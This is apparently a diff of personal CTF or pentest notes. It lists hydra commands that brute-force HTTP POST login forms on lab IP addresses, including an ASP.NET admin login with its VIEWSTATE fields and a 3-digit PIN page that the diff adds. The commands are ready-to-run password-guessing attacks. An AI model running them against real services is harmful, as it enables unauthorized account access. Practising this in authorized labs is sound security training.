@@ -5,3 +5,5 @@ Web page :
  	hydra -l <username> -P <wordlist> 10.10.193.189 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
  	hydra -l pennywise -P <wordlist> 10.10.193.189 http-post-form "/:username=^USER^&password=^PASS^:F=échoué" -V
  	hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=VMQehmU970aDg60usoVPo1lAWBobU%2FyFeawArYA%2BMaZ4SfxXwi92dojsRBzzFYJnuQTd0XBc2qMXvdzzC4eQFp9A7NeEm8XApzENl4%2FzmAAeF9jPJeHML04b1PPOMyML7flTNd8qOZaESFTdVIHNExMIFMgJ9nRXiYOpIyzt4pJLeqyW&__EVENTVALIDATION=0uvWBJgFwI9quqqLKuTsKE%2BEeHUp3QwNFF7oJpJA2imEKyPclsfg%2BmfMQ9JDrALWH5%2BPdMeM3%2BwVBWazi9bL3g%2FJDZjLcsEsTEC3QcGyKTfAG%2Fe1UDqNleCNvNlQNyT3%2FbtXKYeUUXpMIOpe57THst6BkQvlcTBHQ3v3laVf0hDmEPHT&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Se+connecter:L'authentification a échoué" -V
+  hydra -l '' -P 3digits.txt -f -v 10.10.55.220 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
+
